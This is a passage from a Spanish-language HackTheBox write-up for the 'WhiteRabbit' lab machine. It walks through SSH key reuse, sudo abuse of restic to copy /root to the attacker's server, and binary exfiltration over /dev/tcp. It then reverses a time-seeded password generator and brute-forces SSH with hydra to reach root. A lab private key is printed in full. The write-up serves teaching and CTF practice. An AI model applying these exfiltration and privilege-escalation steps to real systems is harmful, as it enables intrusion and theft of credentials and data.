$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00:1q2w3e4r5t6y
~~~

Obtuvimos la contraseña que necesitamos para descomprimir el archivo `bob.7z`

~~~ bash
7z x dev/shm/bob/ssh/bob.7z
Enter password (will not be echoed):
Everything is Ok

Files: 3
Size:       557
Compressed: 572


ls
.rw------- root root 399 B  Thu Mar  6 19:10:35 2025 bob
.rw-r--r-- root root  91 B  Thu Mar  6 19:10:35 2025 bob.pub
.rw-r--r-- root root  67 B  Thu Mar  6 19:11:05 2025 config
~~~ 


## Shell as `bob`

Estos archivos contienen todo lo necesario para conectarnos por `ssh` como el usuario `bob` a la máquina.

Si vemos el contenido del archivo `config`, se mostrará la configuración de conexión, donde se utiliza el puerto `2222` para la conexión

~~~ bash
cat config

Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
~~~

El archivo `bob.pub` contiene la clave pública, la cual en teoría debería estar contemplada dentro del archivo `~/.ssh/authorized_keys` en la máquina víctima. Si es el caso, podremos conectarnos sin contraseña.

El contenido del archivo `bob` corresponde a una clave privada, la utilizaremos para entablar una conexión por `ssh` con la flag `-i`

~~~ bash
ssh -i bob -p 2222 bob@whiterabbit.htb 

The authenticity of host \'[whiterabbit.htb]:2222 ([10.10.11.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[whiterabbit.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
bob@ebdce80611e9:~$ id
bob@ebdce80611e9:~$ uid=1001(bob) gid=1001(bob) groups=1001(bob)
~~~

Cambiaremos el valor de la variable de entorno `TERM` para poder limpiar la pantalla con `Ctrl+L` (sólo es necesario si tienes ese hábito)

~~~ bash
bob@ebdce80611e9:~$ export TERM=xterm
~~~


## Abusing Sudoers Privileges - `restic`

Si listamos los privilegios del comando `sudo`, notaremos que podemos ejecutar `restic` como cualquier usuario del sistema (incluyendo `root`)

~~~ bash
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
~~~

Desde [`gtfobins.io`](https://gtfobins.github.io/gtfobins/restic/#sudo) existe una guía rápida de escalada de privilegios que podemos utilizar.

> Pudiendo ejecutar `restic` como el usuario `root`, podríamos hacer una copia de seguridad de archivos privilegiados.
{: .notice--warning}

Para continuar con la escalada, iniciaremos un servidor con la herramienta [`restic-server`](https://github.com/restic/rest-server?tab=readme-ov-file#build), la cual es necesaria para poder iniciar correctamente un repositorio

~~~ bash
./rest-server --no-auth --path restic 
Data directory: restic
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:8000

~~~

Desde la máquina víctima creamos un nuevo repositorio creando una contraseña (cualquiera, como `test123`)

indicamos la dirección IP y el puerto donde se ejecuta nuestro servidor `restic`

~~~ bash
bob@ebdce80611e9:/tmp$ echo 'test123' > /tmp/pass
bob@ebdce80611e9:~$ sudo restic -r rest:http://10.10.14.218:8000 init --password-file /tmp/pass

created restic repository 8e4e44937d at rest:http://10.10.14.218:8000/

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
~~~

Crearemos una copia de seguridad del directorio `/root` enviando todos los archivos contenidos dentro

~~~ bash
bob@ebdce80611e9:~$ sudo restic -r rest:http://10.10.14.218:8000 --password-file /tmp/pass backup /root

repository 8e4e4493 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files
[0:00]          0 index files loaded

Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.603 KiB stored)

processed 4 files, 3.865 KiB in 0:02
snapshot 1b44949b saved
~~~

Se ha creado una `shapshot` con el identificador `1b44949b`, este es el valor que debemos usar para restablecer los archivos en nuestra máquina.

Antes de cerrar el proceso de `restic-server`, nos vamos a nuestra máquina atacante para restablecer los archivos del repositorio en local, utilizando la misma contraseña que utilizamos para crear el repositorio

~~~ bash
echo 'test123' > pass
restic -r rest:http://localhost:8000 --password-file pass restore 1b44949b --target .

repository 8e4e4493 opened (repository version 2) successfully, password is correct
restoring <Snapshot 1b44949b of [/root] at 2025-09-13 21:27:34.980600092 +0000 UTC by root@ebdce80611e9> to .
~~~

Dos archivos se guardarán dentro de un directorio `root`, con una clave pública y una privada

~~~ bash
cd root
ls

.rw------- root root 505 B Fri Aug 30 07:30:01 2024 morpheus
.rw-r--r-- root root 186 B Fri Aug 30 07:31:44 2024 morpheus.pub
~~~


## Shell as `morpheus`

El archivo `morpheus` contiene la clave privada que nos permite conectarnos por `ssh`

~~~ bash
cat morpheus

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
~~~

Utilizaremos la clave privada de `morpheus` como archivo de identidad, de esta forma obtendremos una consola sin contrseña

~~~ bash
ssh -i morpheus morpheus@whiterabbit.htb 
The authenticity of host \'whiterabbit.htb (10.10.11.63)' can't be established.
ED25519 key fingerprint is SHA256:F9XNz/rgt655Q1XKkL6at11Zy5IXAogAEH95INEOrIE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'whiterabbit.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Sep 11 18:41:47 2025 from 10.10.14.218

morpheus@whiterabbit:~$ id
uid=1001(morpheus) gid=1001(morpheus) groups=1001(morpheus),100(users)
~~~

Para poder limpiar la pantalla con `Ctrl+L`, podemos cambiar la variable de entorno `TERM`

~~~ bash
morpheus@whiterabbit:~$ export TERM=xterm
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
morpheus@whiterabbit:~$ cat user.txt 
849...
~~~
<br>


# Escalada de Privilegios
---
Si mostramos la dirección IP, verificaremos que estamos en la máquina víctima real y no en un contenedor como antes.

~~~ bash
morpheus@whiterabbit:/home$ hostname -I
10.10.11.63 172.18.0.1 172.17.0.1 
~~~


## `password-generator` Command

Recordemos que cuando logramos la inyección SQL, vimos un comando que ejecutaba una herramienta dentro del directorio `/opt` y que se utilizó para asignar una contraseña

~~~ bash
# Registro de la base de datos
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
~~~

- Este comando se dirige al directorio del usuario `neo`, y asigna una contraseña en base a la salida de la ejecución de la herramienta `neo-password-generator`.

Esta herramienta lógicamente existe en el sistema, dentro del directorio `/opt`

~~~ bash
morpheus@whiterabbit:/home$ ls /opt/neo-password-generator/
neo-password-generator
~~~

Transferiremos el archivo a nuestra máquina para llevar a cabo un proceso de análisis. Una de las opciones para transferir el archivo de forma rápida es enviarlo a nuestra máquina utilizando una conexión con el recurso `/dev/tcp`

> `/dev/tcp` es un mecanismo especial del shell `Bash` en sistemas operativos tipo Unix (como Linux) que permite interactuar con servicios de red TCP (Protocolo de Control de Transmisión) directamente desde la línea de comandos o scripts.
{: .notice--info}

Iniciaremos un listener para recibir el binario, dirigiendo la salida de la siguiente forma

~~~ bash
nc -lvnp 443 > password_generator 
listening on [any] 443 ...
~~~

Desde la máquina víctima, dirigimos la salida del comando `cat` hacia a nuestra IP por el puerto que elegimos

~~~ bash
morpheus@whiterabbit:/home$ cat /opt/neo-password-generator/neo-password-generator > /dev/tcp/10.10.14.218/443
~~~

### Tip: File Integrity

Ambos hashes MD5 deben coincidir para saber que no ha ocurrido algún problema en la transferencia

> El comando `md5sum` calcula un hash MD5 para un archivo con el propósito de verificar la integridad de los datos y confirmar que no ha sido modificado durante una descarga o una transferencia.
{: .notice--info}

~~~ bash
# Máquina víctima
morpheus@whiterabbit:/home$ md5sum /opt/neo-password-generator/neo-password-generator 
2e6b7386a22229c98309d4fe44e6a479  /opt/neo-password-generator/neo-password-generator

# Máquina atacante
md5sum password_generator 
2e6b7386a22229c98309d4fe44e6a479  password_generator
~~~


## Reversing - Binary Analysis with `ghidra`

Analizaremos el código descompilado del binario, podemos utilizar herramientas clásicas como `ghidra`. A continuación vemos la función `main`, la cual obtiene la fecha actual y llama a la función `generate_password`

![image-center](/assets/images/posts/whiterabbit-15-hackthebox.png)
{: .align-center}

- Se declara una variable `timeval`, y su estructura es de `2` campos: 
	- `tv_sec`: Segundos desde la época, por ejemplo, 1 de enero de 1970 UTC).
	- `tv_usec`: Microsegundos.
- `gettimeofday(&local_28, (__timezone_ptr_t)0x0);` obtiene la hora actual con precisión de microsegundos.
- Se calcula el parámetro una una llamada a `generate_password`:
	- `local_28.tv_sec * 1000`: convierte los segundos a milisegundos.
	- `local_28.tv_usec / 1000`: convierte los microsegundos a milisegundos (dividiendo entre 1000).

Al inspeccionar la función `generate_password`, veremos cómo se genera una contraseña.

Esta función genera una contraseña de `20` caracteres basada en una semilla

![image-center](/assets/images/posts/whiterabbit-16-hackthebox.png)
{: .align-center}

- `srand(param_1);` establece la semilla para el generador de números aleatorios, siendo `param1` la semilla.
- Se ejecuta un bucle `20` veces (`0x14 = 20` en decimal)
- Toma el módulo de `0x3e` (`62` en decimal) para obtener un índice, desde el `0` al `61`
	- Utiliza ese índice para elegir un caracter del `charset` (`a-z A-Z 0-9`), el cual tiene `62` caracteres.

### Command Date

> Recordemos que en la base de datos se guarda la fecha exacta en la que se ejecutó el comando.
{: .notice--warning}

Extraeremos la fecha exacta en la que ejecutó el comando que involucra a esta herramienta (estaba en la fila `5` de la tabla), podremos ver que se trata del 30 de Agosto del 2024, a las `14:40:42`.

~~~ bash
python3 sqli.py -m dump --table temp.command_log --column date --row 5     
[*] Query: SELECT date FROM temp.command_log LIMIT 5,1
[+] Extracted value: 2024-08-30 14:40:42 
~~~

Podemos imitar la generación de una semilla con el comando `date`, si utilizamos la fecha obtenida, tendremos representada la fecha en segundos

~~~ bash
faketime '2024-08-30 14:40:42 UTC' date +%s                        
1725028842
~~~

### Python Scripting

El único inconveniente es que falta aplicar las operatorias correspondientes. Desde un script de `python` imitaremos este programa

~~~ python
from ctypes import CDLL
import datetime

# Linux
libc = CDLL("libc.so.6")
seconds = 1725028842 # Segundos en UTC -> faketime '2024-08-30 14:40:42 UTC' date +%s

for ms in range(1,1000):
    password = ""
    seed = seconds * 1000 + ms
    
    libc.srand(seed)
    for j in range(0,20):
        password += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[ libc.rand() % 62]
    print(password)
~~~

> Como tenemos de referencia un segundo, generaremos `1` contraseña por cada milisegundo, o sea `1000` contraseñas para probar con el usuario `neo`.
{: .notice--warning}

Ejecutaremos el script para generar un listado de contraseñas posibles

~~~ bash
python3 password_generator.py > passwords.txt
~~~


## SSH Brute Forcing

Con el listado de posibles contraseñas que generamos, haremos un ataque de fuerza bruta por `ssh` para ver si alguna es válida para el usuario `neo`

~~~  bash
hydra -l neo -P passwords.txt ssh://10.10.11.63 -t 10 -I 

[DATA] attacking ssh://10.10.11.63:22/
[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
~~~


## Shell as `neo`

Como hemos descubierto la contraseña del usuario `neo`, nos conectaremos por `ssh` empleando sus credenciales

~~~ bash
ssh neo@whiterabbit.htb     

neo@whiterabbit.htb\'s password: 
Last login: Fri Sep 12 14:35:06 2025 from 10.10.14.218
neo@whiterabbit:~$
~~~

Opcionalmente, podemos cambiar el valor de `TERM` para limpiar la pantalla con el atajo `Ctrl+L`

~~~ bash
neo@whiterabbit:~$ export TERM=xterm
~~~


## Root Time

Si listamos los grupos a los que el usuario `neo` pertenece, notaremos que es parte del grupo `sudo`

~~~ bash
neo@whiterabbit:~$ id
uid=1000(neo) gid=1000(neo) groups=1000(neo),27(sudo)
~~~

Como pertenecemos al grupo `sudo` además de tener la contraseña del usuario, deberíamos poder ser capaces de listar privilegios configurados a nivel de `sudoers`

~~~ bash
neo@whiterabbit:~$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
~~~

Pudiendo ejecutar cualquier comando como `root`, la escalada está en bandeja de plata

~~~ bash
root@whiterabbit:~# sudo whoami
root
~~~

Cambiaremos al usuario `root` simplemente con el comando `sudo su`, pasando la contraseña del usuario `neo`

~~~ bash
neo@whiterabbit:~$ sudo su
root@whiterabbit:/home/neo# whoami
root
~~~

Ahora ya podremos ver la ultima flag, pero primero debemos dirigirnos al directorio `/root`

~~~ bash
root@whiterabbit:/home/neo# cd
root@whiterabbit:~# cat root.txt 
d92...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> Everyone can taste success when the going is easy, but few know how to taste victory when times get tough.
> — Byron Pulsifer
{: .notice--info}
